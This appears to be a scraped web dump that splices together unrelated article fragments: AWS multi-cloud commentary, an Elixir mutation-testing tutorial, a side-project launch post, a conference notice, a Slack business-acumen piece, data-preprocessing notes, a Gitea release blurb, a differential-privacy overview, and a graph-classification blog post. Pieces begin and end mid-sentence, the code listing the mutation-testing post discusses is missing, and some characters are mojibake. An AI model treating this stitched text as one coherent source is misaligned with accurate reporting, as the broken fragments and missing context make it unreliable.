but 75% of people won’t think of AWS as their “primary” cloud provider forever. Not when there are so many best-of-breed services to choose from, both on other clouds and on focused SaaS providers like Snowflake and Datadog. And certainly not given that plenty of industries have active incentive to avoid deep integration with a cloud provider owned by Amazon.</p><p>So AWS has a limited window of opportunity to keep that central status in cloud teams’ hearts. Providing higher-level, cross-cloud management tools is the easiest way to do it. The other cloud providers certainly get this; Azure isn’t hamstrung by an inability to admit the validity of AWS workloads, and they’re rushing into the breach with tools like Arc and Sentinel.</p><h2 id="h-this-is-only-the-beginning">This is only the beginning</h2><p>Really, the amazing thing is that AWS spun the “Anywhere” releases so adroitly, and described them so diffusely, that it took a day to confirm that multi-cloud was really their intent. And they can’t keep playing both sides much longer. They need to signal to large customers that yes, they get that Azure isn’t going away, and they’ll provide the tools to continue deserving the status of <em>preferred </em>cloud provider even if they can’t be the <em>only </em>cloud provider.</p><p>If you think that’s a bridge too far, you haven’t been paying attention to what makes AWS tick. I closed my last multi-cloud piece by pointing out that AWS created ECS because they have great engineers; they sell EKS because they are smart. As long as they are willing to cannibalize their own offerings in pursuit of customer value, they will remain hard to beat.</p><figure><div><blockquote data-width="500" data-dnt="true"><p lang="en" dir="ltr">My ears are perking up at <a href="https://twitter.com/ajassy?ref_src=twsrc%5Etfw">@ajassy</a>'s comments about working with third parties, not being afraid of cannibalizing yourself, etc … are we revving up to the announcement of AWS's much-ballyhooed multicloud play? <a href="https://twitter.com/hashtag/reinvent?src=hash&amp;ref_src=twsrc%5Etfw">#reinvent</a></p>— Forrest Brazeal @re:Invent 2020 (@forrestbrazeal) <a href="https://twitter.com/forrestbrazeal/status/1333806720993333250?ref_src=twsrc%5Etfw">December 1, 2020</a></blockquote> </div></figure><p>Lo and behold, Jassy echoed the same themes in his keynote. And while he never used the word “multi-cloud” (not yet!), you can be sure that EKS Anywhere isn’t a one-off or an accident. It’s the first glimpse of a massive strategic shift. Because once you realize what yesterday’s emphasis on “hybrid, open-source” rhetoric really means, it’s clear that AWS’s multi-cloud play is just beginning.</p></div></div></div>]]>

<p>It’s fairly common for folks who haven’t used mutation testing before to not immediately see
the value in the practice. Mutation testing is, after all, still a fairly niche and under-used
tool in the average software development team’s toolbox. So today I’m going to show a few specific
types of <em>very</em> common problems that mutation testing is great at finding for us, and that
are hard or impossible to find with other methods. This is the code that we’ll be working with
today:</p>

</span><span data-group-id="3847153202-1">end</span></code></pre>
<p>Here’s what <code>cover</code> says about our tests:</p>
<p><img src="http://devonestes.com/images/cover_example.png" alt="cover output"></p>
<p>We can see here that we have 100% code coverage, so we should be all good in terms of testing,
right? There’s no way we could have any bugs here, and there’s <em>definitely</em> no way we can
reasonably break this code without causing a failing test.</p>
<p><strong>Just kidding!!</strong> Neither of those two functions work at the moment, and we’re not testing all of
the behavior in either of them despite “100% code coverage,” so it’s really easy to introduce a
regression without causing a failing test.</p>
<h2>The “multiple execution paths on a single line” problem</h2>
<p>In our test for the <code>stringify_keys/1</code> function, and the <code>cover</code> output for that test, we can see
that we’re testing both branches in the <code>if</code> statement in that function. But our test for that
function only passes a tuple as a key and never a map! So, if we were to change that code to be:</p>
<pre><code><span>if</span><span> </span><span>is_nil</span><span data-group-id="8320073969-1">(</span><span>k</span><span data-group-id="8320073969-1">)</span><span> </span><span>or</span><span> </span><span>is_tuple</span><span data-group-id="8320073969-2">(</span><span>k</span><span data-group-id="8320073969-2">)</span><span> </span><span data-group-id="8320073969-3">do</span><span>
  </span><span data-group-id="8320073969-4">{</span><span>inspect</span><span data-group-id="8320073969-5">(</span><span>k</span><span data-group-id="8320073969-5">)</span><span>,</span><span> </span><span>v</span><span data-group-id="8320073969-4">}</span><span>
</span><span data-group-id="8320073969-3">else</span><span>
  </span><span data-group-id="8320073969-6">{</span><span>to_string</span><span data-group-id="8320073969-7">(</span><span>k</span><span data-group-id="8320073969-7">)</span><span>,</span><span> </span><span>v</span><span data-group-id="8320073969-6">}</span><span>
</span><span data-group-id="8320073969-3">end</span></code></pre>
<p>we wouldn’t see a failing test. This could be correct behavior, or we could be introducing a bug
that might cause real problems for the users of our software - we just don’t know, because that
behavior isn’t tested anywhere! This is one of the huge ways in which “code coverage” that just
counts by lines of code executed in a test run falls short: it assumes that each line of code
contains a single execution path through the code in question, and that’s <strong>often</strong> wrong.</p>
<p>Mutation testing, on the other hand, shows us if we’re missing test cases based on the <strong>logic</strong>
in our code instead of based on the <strong>lines</strong> in our code. I think we can all agree that this is a
far better measure of code coverage for an application, right?</p>
<h2>The “untested side effect” problem</h2>
<p>At first glance, the code in our <code>write_json_to_file/2</code> function might <em>seem</em> correct, and it
certainly is doing <em>something</em>, but based on those variable names I don’t think it’s actually
doing what we want. If you run this test, you might see a strange file created on your filesystem:</p>
<pre><code>$ cat '{"test":"map"}'
tmp/CoverExampleTest/test-write_json_to_file-2-gives-us-the-correct-JSON</code></pre>
<p>Yep - the file path and the file contents are switched! And yet we have 100% code coverage and
no failing tests, so all the feedback we’re getting is telling us that things are good. This is
because we have an <strong>untested side effect</strong> in that function. And the real kicker is, like 90% of
the really important and useful stuff that happens in most applications are <strong>side effects</strong>. If
we’re not testing them, then we’re running a really high likelihood of a regression in an
important part of our application.</p>
<h2>The “missing pin” problem</h2>
<p>Those first two problems I’d say are the biggest things that mutation testing can find for you
that you <em>can’t</em> easily find through things like looking at code coverage based on LOC. This next
problem however, is much more rare (although I still see it at least a couple times a year) and
very Elixir specific, so I figured I’d include it here today.</p>
<p>Our test for <code>write_json_to_file/2</code> is currently passing even though we’re probably not doing what
the developer wanted it to do. Why could that be?</p>
<p>We’re missing a <code>^</code>! The <code>^</code> (called the “pin operator”) is used to avoid re-binding a variable in
a pattern match, but it’s <em>super</em> easy to forget them in tests, or to use the match operator <code>=</code>
in place of the equality operator <code>==</code> in a test. In either of those cases, you’ll end up with a
passing test where you shouldn’t have one.</p>
<p>If we change <code>assert expected = stringified</code> to <code>assert ^expected = stringified</code> or
<code>assert expected == stringified</code> we’ll see the failure that the developer who wrote that code
probably intended to show. Mutation testing can give us this feedback to at least let us know that
there’s something that’s still not quite right and might need some additional human intervention
to resolve.</p>
<h2>Use computers instead of humans</h2>
<p>The most important thing to note here is that currently, without mutation testing, the only way
you’ll get feedback about these issues is from a human giving it to you. Either you’ll figure it
out yourself as you’re working on the code, or maybe someone will pick it up in a PR review, or
you’ll get a bug report from a QA tester or a user. But for most teams there’s no automated way of
getting this feedback quickly and easily that will scale with a development team as it grows -
this is where mutation testing comes in!</p>
<p>Code coverage is yet another thing that roughly follows the
<a href="https://en.wikipedia.org/wiki/Pareto_principle">Pareto Principle</a>. Code coverage based on lines
of code executed gets you 80% of the way there and takes 20% of the effort. It’s easy to do, and
it’s pretty good! But for applications that need (or want) a higher level of coverage, they’re
going to need something like mutation testing to give them that extra 20% that other tools and
techniques just can’t offer.</p>

      <div><p>Over the past year and a half, I have been using Familio for my own family organization. In April, at the start of the COVID-19 pandemic, I decided to make the Familio Minimum Viable Product(MVP) accessible to the internet. Now, I'm excited to announce the public launch of Familio.Â&nbsp; There was a large gap between making Familio public and being ready for launch. I had to ensure Familio was able to communicate the value prop of being a privacy focused family platform via the copy and branding of the product. As a product minded software engineer, I have a deep focus on the function of the product but not enough focus on the chrome around the product. A functioning product is great but to have it ready for launch requires a few different areas of work. Building experiences for knowledgeable users is fine for a MVP but it's also important to design for the people with zero product knowledge. This was the biggest gap I need to cross with Familio.</p><p>I want to share what I did with Familio to get ready for public launch. There are four areas of work to ensure your product can stand on it's own and be able to attract users with no prior knowledge of. For each of these areas I will go over the general concept and what I did to improve that area.</p><p><strong>What it takes to get products from MVP to Launch:<br></strong></p></div><ol>
<li>
<strong>Focus on branding and copy.</strong><br>The product needs to speak for itself. When a random person on the internet stumbles onto your website, they need to understand all the value the product provides from the website itself. You aren't there to explain it for them or answer questions. It's simple marketing 101 but it's important to put in the time to communicate that value. No matter how good the product is, if a person doesn't know what the product does and find it compelling enough to sign up, it's all for not.<br>For me, I talked with my sister-in-law who is a copy writer for a branding agency. I showed her the website without context, had her ask questions, then helped me create the content. It took fresh eyes and focus on the content to make the copy of Familio shine. Value props that I thought were important weren't and some smaller features were actually the most interesting to her. The branding and copy will always change as you learn more about your customers but investing in the copy makes Familio speak for itself.</li>
<li>
<strong>Ensuring a smooth and fun onboarding process</strong><br>Onboarding is the zero to one experience for your users. First impressions are critical as the product only gets one chance before forgotten. Teach the user the core functionality, lead them through their first product "moment" and ensure they get across the finish line. Without an onboarding experience, you are throwing the user directly in the deep end of a pool without any help. <br>Frankly, this is the area I still want to improve the most. Right now there is a 4 step onboarding wizard that helps users set up accounts and ask for their payment information. There is definitely more to do here. <a href="https://familio.life/users/sign_up">Give Familio a try</a> and let me know what you think about the onboarding.</li>
<li>
<strong>Adding help text and clear instructions</strong><br>Adding onto items 1 and 2, it's important to provide help and instructions within the product. While building the product, you will know everything about the functionality while your users which know nothing. Add in helpful text, clear instructions and useful zero states. Even though these items are only seen once, it's an import part to making your product complete.<br>For each product section(Contacts, Photo Albums, Newsletters and Recipes), I added help panels that explain the functionality and how to use the utilities. It's consistent, clear and always available. For each list, Familio has a zero state which shares more about the section and has a call to action to create their first one. All of this will help users understand and learn the product.</li>
<li>
<strong>Side project marketing</strong><br>Unlike the Field of Dreams, if you build it they won't come. You will need to seed awareness for your product. This requires you to go out into the world and share your product. My advice is to not look at marketing as an instant success/failure but to instead look at the momentum. Are there more users than last month? Have you shared the product in more places than before? <br>For me, I shared Familio on HackerNews, <a href="https://www.producthunt.com/posts/familio">Product Hunt</a>, and my family/friends. It's a small seed but this starting momentum has started the ball rolling.Â&nbsp;</li>
</ol><div>
<p>I hope these four steps help you take a side project to a publicly sharable product. Focus on the polish and the get your users to love your product. I'm excited for Familio to see a wider audience and get wider adoption.</p><p>Cheers ðŸ�»,</p><p>Mike</p></div>

        <strong>Rebase</strong> is a new conference for and by practitioners who want to engage academics about tomorrow's technologies while fondly recalling the achievements of yesterday.
      </p>
      
      <p>
        This year, <strong>Rebase</strong> was planned to occur twice, once in Berlin
        with the <a href="https://2020.ecoop.org/">ECOOP</a> conference and
        once in Chicago with the <a href="https://2020.splashcon.org/">SPLASH</a> conference.
        Due to outside forces, there will be a single virtual event.
      </p>
      
      <p>
        <strong>Rebase</strong> will use the Clowdr platform for interaction,
        registration allows attendees to ask questions and meet with each other
        and with speaker. Registration also give access to all of the
        <a href="https://2020.splashcon.org/">SPLASH</a> co-located events.
      </p>
      
      <p>
        <strong>Rebase is free. All talks were streamed live and are now available on <br> <a href="https://www.youtube.com/playlist?list=PLyrlk8Xaylp6aNlOgiyE4W30X7DpXx74m"><i></i>&nbsp;YouTube</a>.</strong>

<p>Let’s walk through this.</p>



<p id="h-in-general-a-company-can-make-money-through-several-different-streams-most-companies-generate-revenue-from-paying-customers-a-customer-either-pays-a-one-time-fee-or-more-common-today-a-recurring-payment-also-known-as-a-subscription-the-more-paying-customers-the-business-has-the-more-revenue-it-generates-and-in-turn-also-generates-more-profits">In general, a company can make money through several different streams.<br>Most companies generate revenue from paying customers. A customer either pays a one-time fee or, more common today, a recurring payment, also known as a subscription.<br>The more paying customers the business has, the more revenue it generates and, in turn, also generates more profits.</p>



<p>Let’s get more specific and use Slack as an example.<br>Slack offers Chat and Collaboration for teams to work more effectively, mostly if team members work from different physical locations.<br>Slack generates revenue from paying customers. The more organizations sign up, the better.<br>But, how does Slack acquire new customers?<br>It’s a two-fold problem. For one, people need to know that Slack exists. The company achieves this through advertisements online and on billboards.<br>If a single person signs up, they don’t get too much value out of it. It only becomes useful once more team members join. Therefore, they have their team members sign up as well.<br>Who is Slack’s target customer? It is not everyone.<br>They target organizations that benefit from streamlined collaboration across physical boundaries.<br>Often, though, getting into these organizations through the front door, meaning following a standardized purchasing process, is tiring, especially if you’re brand-new.<br>How does Slack get introduced into organizations then?<br>They come in through the side door. For instance, a few people within an organization send information back and forth via email. If you ever used email extensively, you know it’s easy to lose track of conversations and information.<br>They decide to give Slack a try. Signing up is easy, and sharing information is more straightforward.<br>They open a set of different Slack channels for various topics and start collaborating in real-time.<br><strong>The only limit</strong>: They can only access the last 10,000 messages within the workspace. It’s not ideal, but acceptable for now. Other team members start to join because the information they need is only available in these Slack channels.<br>And soon, the workspace has grown enough that employees can make a compelling case to leadership to convert to a paid plan.<br>Slack grows its reach and makes it easier to convert non-paying into paying customers over time.<br>Lastly, to make this work effectively, Slack needs to understand precisely how their customers make money.</p>



<h2 id="h-why-you-need-to-know-how-your-customers-make-money">Why you need to know how your customers make money</h2>



<p>Whatever you offer to your customers comes at a price. Preferably, at a price that provides you with a desirable margin. But how can you charge a high price and have the customer pay it?<br>Let’s find out exactly how you can generate value for the customer.</p>



<p>Slack understands that their customers want to collaborate on projects straightforwardly and as fast as possible across physical boundaries.<br>They ask the crucial question: “If our customer can finish a week early or team members can work effectively from home, what impact does that have on their business?”<br>The answer can be additional revenue or gaining a competitive advantage over competitors.<br>Now, if Slack provides that much value, the customer has little reason to hesitate and purchase seats for all team members.<br>Suddenly, what seemed like a considerable expense beforehand became an investment in the team and the company.</p>



<h2 id="h-how-does-business-acumen-relate-to-your-role-in-software-development">How does Business Acumen relate to your role in Software Development?</h2>



<p><br>Your primary focus might be on cutting-edge technologies you’d like to work with soon.<br>That’s the reason why the company hired you in the first place. You know which technologies to introduce to bring value to the table.<br>What if you expanded your focus not just to deliver great software but also increased value for your customer?<br>Invest more effort to understand the customer, where they come from, what you can do to help with as fast as possible.<br>It means to evaluate technology not just on its merits that affect you, but also how they can help the customer. For instance, if you choose between a cutting-edge and brand new framework and a battle-tested framework, which impact does it have on the customer?<br>If you choose the former, the customer might experience more bugs, less reliable software, and can’t work as productive.<br>The battle-tested framework might not be as exciting from a programming point of view but helps to deliver reliable software right from the start.<br>The customer can work uninterruptedly, and also it means fewer outages during on-call shifts.</p>



<p>What do you think? What impact does Business Acumen have on your daily work and position?<br>Share your experience in the comments.</p>

<h3><u>Intuition</u></h3>
<p>Data preprocessing can be categorized into two types of processes: <em>preparation</em> and <em>transformation</em>.</p>
<blockquote>
<p>Certain preprocessing steps are <code>global</code> (don’t depend on our dataset, ex. removing stop words) and others are <code>local</code> (constructs are learned only from the training split, ex. vocabulary or min-max scaling). For the local, dataset-dependent preprocessing steps, we want to ensure that we split the data first before preprocessing to avoid data leaks.</p>
</blockquote>
<p>🧹 <em>Preparing</em> the data involves organizing and cleaning the data.</p>
<ul>
<li><strong>joins</strong>:
<ul>
<li>performing SQL joins with existing data tables to <em>organize</em> all the relevant data you need in one view.</li>
</ul>
</li>
<li><strong>typing</strong>:
<ul>
<li>ensure that all the values for a specific feature are of the same data type, otherwise you won’t be able to compare them.</li>
</ul>
</li>
<li><strong>missing values</strong>:
<ul>
<li>omit samples with missing values (if only a small subset are missing it)</li>
<li>omit the entire feature (if too many samples are missing the value)</li>
<li>fill in missing values for features (using domain knowledge, heuristics, etc.)</li>
<li>may not always seem “missing” (ex. 0, null, NA, etc.)</li>
</ul>
</li>
<li><strong>outliers (anomalies)</strong>:
<ul>
<li>craft assumptions about what is a “normal” expected value</li>
<li>be careful about removing important outliers (ex. fraud)</li>
<li>anomalies can be global (point), contextual (conditional) or collective</li>
</ul>
</li>
<li><strong>clean</strong>:
<ul>
<li>use domain expertise and EDA</li>
<li>images (crop, resize, clip, etc.)</li>
<li>text (lower, stem, lemmatize, regex, etc.)</li>
</ul>
</li>
</ul>
<blockquote>
<p>You need to clean your data first before splitting, at least for the features that splitting depends on. So the process is more like: preprocessing (global, cleaning) → splitting → preprocessing (local, transformations). We covered splitting first since many preprocessing transformations depend on the training split.</p>
</blockquote>
<p>🤖 <em>Transforming</em> the data involves feature encoding and engineering.</p>
<ul>
<li><strong>scaling</strong>:
<ul>
<li>required for most models that are not decision tree based</li>
<li>learn constructs from train split and apply to other splits (local)</li>
<li>don’t blindly scale features (ex. categorical features)</li>

<p>Often, teams will want to reuse the same features for different tasks so how can we avoid duplication of efforts? A solution is <code>feature stores</code> which will enable sharing of features and the workflows around feature pipelines. We’ll cover feature stores during <em>Production</em>.</p>
</blockquote>
<blockquote>
<p>When we move our code from notebooks to Python scripts, we’ll be testing all our preprocessing functions (these workflows can also be captured in feature stores and applied as features are updated).</p>

<blockquote>
<p>Our data splits were dependent only on the target labels (tags) which were already cleaned. However, if your splits depend on other features as well, you need to at least clean them first before splitting. So the process is more like: preprocessing (global, cleaning) → splitting → preprocessing (local, transformations).</p>
</blockquote>
<p>Many of the <em>transformations</em> we’re going to do are model specific. For example, for our simple baselines we may do <code>label encoding</code> → <code>tf-idf</code> while for the more involved architectures we may do <code>label encoding</code> → <code>one-hot encoding</code> → <code>embeddings</code>. So we’ll cover these in the next suite of lessons as we implement each baseline.</p>

			<p>We are proud to present the release of Gitea version 1.13.0.</p>
<p>As we approach Gitea’s <a href="https://blog.gitea.io/2016/12/release-of-1.0.0/">4th birthday</a>, I just want to give a special thanks to everyone who has been a part of the project, whether it’s the implementation of a feature, or just enjoying the software.<br>
Thank you all!</p>
<p>We have merged an incredible <a href="https://github.com/go-gitea/gitea/pulls?q=is%3Apr+milestone%3A1.13.0+is%3Amerged">649</a> pull requests to release this version.</p>

<p>The growth of AI and machine learning (ML) has led researchers to think, research and stress the development of ethical AI solutions - with AI models / solutions able to provide:</p>
<!--more-->
<ul>
<li>Explainability &amp; Interpretability</li>
<li>Privacy&nbsp;</li>
<li>Fairness</li>
<li>Model Governance</li>
</ul>
<p>The concept of privacy introduced for ML has been extended from individual / standalone models to distributed training such as federated learning. Here models trained locally are sent to decentralized servers that aggregate model weights and inferences from several individual devices to yield an aggregated ensemble model of greater privacy and trust. With further extensive AI research and translating research to productionizing solutions, hybrid ML models find its usage in different industrial domains.</p>
<p>Such hybrid models built using Differential Privacy at Application level and Secured Transfer Protocol at transport level have been used extensively to build scalable solutions in the following industry domains.</p>
<ul>
<li>Distributed Control Systems</li>
<li>Industrial IoT Systems</li>
<li>Supply Chain</li>
<li>Retail</li>
<li>Financial Services</li>
<li>Health Care</li>
<li>Automotives and Electrical vehicles&nbsp;&nbsp;</li>
<li>Locomotives/Transportation Systems</li>

<ol>
<li>Differential Privacy applications developed by software giant's Google, Apple, Microsoft</li>
<li>Differential Privacy for Location Based Services</li>
<li>Differential Privacy for IoT Sensors for Edge and Fog Computing</li>
</ol>
<p>Our discussion remains confined within the scope of Local Differential Privacy where each user is responsible for maintaining a differentially private mechanism to their <strong>own</strong> data through addition of noise mechanisms. To know more about Global vs Local Differential Privacy refer to <a href="https://desfontain.es/privacy/local-global-differential-privacy.html%C2%A0" rel="noopener">this article</a>.</p>
<h2><span>Local Differential Privacy (LDP) Based Solutions</span></h2>
<h3><span>Rappor By Google</span></h3>
<p>The <a href="http://static.googleusercontent.com/media/research.google.com/en/us/pubs/archive/42852.pdf" rel="noopener">RAPPOR (Randomized Aggregatable Privacy-Preserving Ordinal Response)</a> implemented in Chrome browse collects data from opt-in users, tens of millions per day by Tracking in&nbsp; settings in the browser, e.g. home page, search engine and protects them from unwanted or malicious hijacking. It eliminates the need for a trusted third party server and puts control over client’s data back into their direct control.</p>
<p>It works on the principle of randomized response that provides strong Differential Privacy (DP) guarantee and protection. It operates by collecting statistics on sensitive topics by crowdsourcing from end-users, through client-side software where survey respondents wish to retain confidentiality. The RAPPOR mechanism is performed locally on the client, and does not require a trusted third party. In terms of frequency, the data from clients where data is collected repeatedly (or even infinitely often).</p>
<p>RAPPOR can be used to collect statistics on categorical client properties, by having each bit in a client’s response represent whether, or not, that client belongs to a category.&nbsp;&nbsp;&nbsp;</p>
<p>It functions by limiting the number of correlated categories, or Bloom filter hash functions, reported by any single client. This helps RAPPOR to maintain its differential-privacy (DP) guarantees even when statistics are collected on multiple aspects of clients.&nbsp;</p>
<p>The foremost limitation of RAPPOR is Its slowness and limited application.</p>
<h3><span>LDP in IOS, IPhone, Mac - Apple Products</span></h3>
<p><a href="https://en.wikipedia.org/wiki/Local_differential_privacy" rel="noopener">Local Differential Privacy (LDP)</a>, applied on the platforms used by Apple works on the principle of&nbsp; statistical noise that is slightly biased and can mask a user’s individual data before it is shared with Apple. On receiving similar data inputs from several people, the added noise helps to average out large numbers of data points, thereby setting a clear inference before Apple which they can use as their benefit to derive meaningful information.</p>
<p>It uses the principle of privacy budget (quantified by the parameter epsilon), and sets a strict limit on the number of contributions from a user in order to preserve their privacy.&nbsp;</p>
<p>Suitable metrics with insights improves the intelligence and usability from the following applications. In addition, it also protects the privacy of user activity in a given time period</p>
<ul>
<li>QuickType suggestions</li>
<li>Emoji suggestions</li>
<li>Lookup Hints&nbsp;</li>
<li>Safari Energy Draining Domains</li>
<li>Safari Autoplay Intent Detection (macOS High Sierra)</li>
<li>Safari Crashing Domains (iOS 11)</li>
<li>Health Type Usage (iOS 10.2)</li>
</ul>
<p>The Count Mean Sketch technique allows Apple to determine the most popular emoji to help design better ways to find and use our favorite emoji.&nbsp;</p>
<p>Count Mean Sketch and Hadamard Count Mean–based Sketch techniques for differential privacy relies on noise addition along with hash encoding using a series of mathematical functions.</p>
<p>Apple Sketches and Transform count frequencies of items/typing statistics. Apple uses their system to collect data from iOS and OS X users Popular emojis, popular words, which websites to mute and where to play audio.</p>
<p>The system is composed of Ingestor and Aggregator where private info like IP is stripped off and processed in a batch that removes metadata, such as the timestamps of privatized records received, and separates these records based on their use case.</p>
<p>The architecture strives to obtain a tradeoff among factors, including privacy, utility, server computation overhead, and device bandwidth, without lowering accuracy.</p>
<h3><span>Local Differential Privacy&nbsp; in Microsoft Products</span></h3>
<p>Microsoft leveraged Local Differential Privacy (LDP) to protect user privacy in several applications, including telemetry in Windows (used by millions of users), advertiser queries in LinkedIn, suggested replies in Office, and manager dashboards in Workplace Analytics which is a pluggable open source library of differentially private algorithms.</p>
<p>The DP platform provided by Microsoft provides a <span>host of components that can be flexibly configured, allowing big data specialists to use the best and right set of services for their environments.</span></p>

<p>The framework is equipped with mechanisms related to implementations based on mature differential privacy research and APIs for defining an analysis. Each analysis is supported by suitable validation techniques for estimating the total privacy loss.</p>
<p><span>The Telemetry private data collection employs:</span></p>
<ul>
<li>1BitMean to collect numeric data, independently from different users</li>
<li>dBitFlip to collect (sparse) histogram data from each user independently, distributed across buckets.</li>
</ul>
<p>According to Microsoft’s DP design principles <em>“the continuous collection of counter data is strong when the user's behavior remains approximately the same, varies slowly, or varies around a small number of values over the course of data collection”.</em></p>
<p>Memoization and perturbation techniques applied by Microsoft in the context of private collection of counters, avoids substantial losses in accuracy or privacy, functioning well when data is collected over long periods of time.</p>
<h2><span>Challenges</span></h2>
<p>The real challenge in scaling DP solutions lies in its integration into real-world environments with highly customized data structures. Further it also needs good KPIs for performance and reliability. Legacy DP systems require modification to existing data pipelines or replacement of database engines, while integrating to ML systems and Big Data pipelines.</p>
<p>For edge computing the challenge lies in limitations of individual edge-servers in detecting threats. Edge servers are middleware components that can serve as a distillation point for sensitive data before they are sent to the cloud. Further, when edge servers become the centre of data processing and storage, then they may not have enough resources to protect themselves.</p>
<p>To develop a safe ecosystem for edge-computing, it’s essential to design a scalable, efficient, and decentralized security mechanism.&nbsp;</p>
<h2><span>Differential Privacy for Location Based Services</span></h2>
<p>For automotives and related location-based services real-time data processing along with preserving location privacy are essential for providing security&nbsp; to the driver. Edge-computing can be seen as a promising solution to offer efficient differentially privacy-preserving&nbsp; location-based services where computing and storage resources can be placed at the network&nbsp; edge. Edge nodes (e.g., road side</p>
<p>infrastructures and base stations) takes the responsibility from remote-servers to provide privacy enabled solutions&nbsp; by ensuring location privacy in its coverage by balancing both utility and privacy.</p>
<p>The fundamental principle in building&nbsp; the framework lies in creating two services, Differentially Privacy-preserving&nbsp; Location-based Service Usage (Pri-LBS) mechanism and Privacy Level Adjustment (PLA) module, which are designed to enable vehicles to request useful information based on&nbsp; the&nbsp; submitted&nbsp; location&nbsp; without&nbsp; revealing&nbsp; their&nbsp; location privacy.&nbsp; Any vehicle registered with this service first submits its location to the edge node. The edge node executes the privacy-preserving mechanism by …</p></span></p></div></div></div></div></div></div></div></div>

<blockquote><p> The <a href="https://en.wikipedia.org/wiki/Microwave_auditory_effect">microwave auditory effect</a>, also known as the Frey effect, consists of the human perception of audible clicks, or even speech, induced by pulsed or modulated radio frequencies. The communications are generated directly inside the human head without the need of any receiving electronic device. The effect was first reported by persons working in the vicinity of radar transponders during World War II.  In 1961, the American neuroscientist Allan H. Frey studied this phenomenon and was the first to publish information its nature.<br></p></blockquote><p>

December 2, 2020 | https://bastian.rieck.me/blog/posts/2020/topology_graphs/ | <a href="https://web.archive.org/web/*/https://bastian.rieck.me/blog/posts/2020/topology_graphs/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <p>I have written at lengths about certain aspects of topological data
analysis, but I have neglected to discuss one of its main applications,
i.e. the classification of graphs. In this post, I will therefore take
you on a quick tour of our ICML paper <a href="http://proceedings.mlr.press/v97/rieck19a/rieck19a.pdf">A Persistent Weisfeiler–Lehman Procedure for Graph Classification</a>.</p>
<p>Let us assume that we are given a graph with node label information. The
graph could, for instance, be a molecule, whose nodes are atoms such as
carbon or oxygen, and whose edges indicate chemical bonds. The goal
could now be to classify a given molecule into a set of classes, such as
‘toxic’, ‘carcinogen’, etc. How can we achieve such a classification?
One of the simplest techniques dates back to the 1960s and involves
calculating an <em>iterative fingerprint</em> of the graph! This procedure was
suggested by <a href="https://en.wikipedia.org/wiki/Boris_Weisfeiler">Boris Weisfeiler</a>
and Andrei Lehman&nbsp;(sometimes also transliterated as ‘Leman’) in
their seminal article <a href="https://www.iti.zcu.cz/wl2018/pdf/wl_paper_translation.pdf">The reduction of a graph to canonical form and the
algebra which appears therein</a>.</p>
<p>At its core, the algorithm is an iteration scheme that works like this:</p>
<ol>
<li>For a node $v$, collect its label and the labels of adjacent nodes in
a multiset.</li>
<li>Assign this multiset a new label by hashing it—with the proviso
that the hashing function is <a href="https://en.wikipedia.org/wiki/Perfect_hash_function"><em>perfect</em></a>, i.e.
it maps distinct labels to distinct values with no collisions.</li>
<li>Replace all node labels by their multiset hashes.</li>
</ol>
<p>Intuitively, each step of the algorithm accumulates more information
from nodes that are further removed from the current node. The hashed
multiset label is thus an expression of the neighbourhood around
a node—and after a sufficiently large number of iterations, the
hashed labels will not change any more.</p>
<p>For example, suppose you are dealing with this simple graph&nbsp;(to
prevent confusion of node labels and node IDs, I used <em>colours</em> to
indicate node labels in this example):</p>
<div>
<figure>
    <img src="https://bastian.rieck.me/images/weisfeiler_lehman_graph.svg" alt="Weisfeiler--Lehman example graph" height="128"> 
</figure>

</div>
<p>Tabulating the neighbourhood of each node then results in the following
table:</p>
<div>
<figure>
    <img src="https://bastian.rieck.me/images/weisfeiler_lehman_table_1.svg" alt="Weisfeiler--Lehman multiset example (before hashing)" height="128"> 
</figure>

</div>
<p>Now for the hashing step. In this example, <em>perfect hashing</em> means
choosing a set of colours that is distinct for every distinct
combination of neighbourhood labels and vertex labels:</p>
<div>
<figure>
    <img src="https://bastian.rieck.me/images/weisfeiler_lehman_table_2.svg" alt="Weisfeiler--Lehman multiset example (after hashing)" height="128"> 
</figure>

</div>
<p>Notice how nodes A, B, and G are hashed to the same colour—because
in the first iteration of the algorithm, they cannot be distinguished.
How can we use the information about the hashed labels in a subsequent
comparison task? The answer is lies in <em>counting</em> them in a histogram
vector, which is indexed by the unique labels—this is where our
requirement of the perfect hashing function is helpful. For the
previously-shown graph, it looks like this:</p>
<div>
<figure>
    <img src="https://bastian.rieck.me/images/weisfeiler_lehman_feature_vector.svg" alt="Weisfeiler--Lehman subtree feature vector" height="128"> 
</figure>

</div>
<p>The <em>fingerprint</em> of this graph, according to the first iteration of the
Weisfeiler–Lehman scheme is therefore $(3, 1, 2, 1)$. Further iterations
just make the feature vector longer&nbsp;(technically, the initial
labels already give rise to a feature vector of counts). This procedure
can now be repeated for higher-order iterations and the resulting
feature vectors can be compared across graphs by evaluating, for
example, their dot product. More formalisations of this idea have
resulted in the very successful <a href="https://www.jmlr.org/papers/volume12/shervashidze11a/shervashidze11a.pdf">Weisfeiler–Lehman Graph
Kernels</a>
publication. This method arguably constitutes the basis for graph neural
networks—in fact, these networks can be seen as a parametrised
version of the Weisfeiler–Lehman iteration scheme. But I digress—if
you are interested in these aspects, please read <a href="https://towardsdatascience.com/beyond-weisfeiler-lehman-approximate-isomorphisms-and-metric-embeddings-f7b816b75751">Michael Bronstein’s
article on going beyond graph
isomorphism</a>
for more details.</p>
<p>Now, despite its great practical utility, this feature vector is lacking
some <em>structural</em> information about the graph. It does not know whether
a certain label contributes much to the topological structure of
a graph—such as a ring of carbon atoms would in molecule—or not. To
this end, we introduced a notion of topological relevance for each node
label! Briefly put, we first developed a distance metric that would
permit us turn any <em>labelled</em> graph into a <em>weighted</em> graph. We then
calculate a persistence barcode, a topological descriptor of the graph.
This descriptor assesses the relevance of a topological feature created
by some node label. We use the topological relevance of each feature as
an additional <em>weight</em> for the previously-shown feature vector. In
essence, labels that contribute a large amount of topological structure
in a graph are assigned a higher weight than labels that only contribute
a meagre amount!</p>
<p>Here is a graphical depiction of our process:</p>
<div>
<figure>
    <img src="https://bastian.rieck.me/images/p_wl_pipeline.svg" alt="Persistent Weisfeiler--Lehman pipeline" height="128"> 
</figure>

</div>
<p>If you want to brush up your understanding of the barcode calculation,
head on over to <a href="https://christian.bock.ml/">Christian’s website</a>; he has
an <a href="https://christian.bock.ml/posts/persistent_homology">excellent article on persistent
homology</a>.</p>
<p>The neat thing about our approach is that we can easily integrate
information about <em>cycles</em> into the feature vector—this is
a functionality that the original Weisfeiler–Lehman Graph Kernels
Framework lacks. Moreover, these cycles turn out to be crucial in
improving classification performance—we get an increase of more than
3% in classification accuracy by considering them in some data sets!</p>
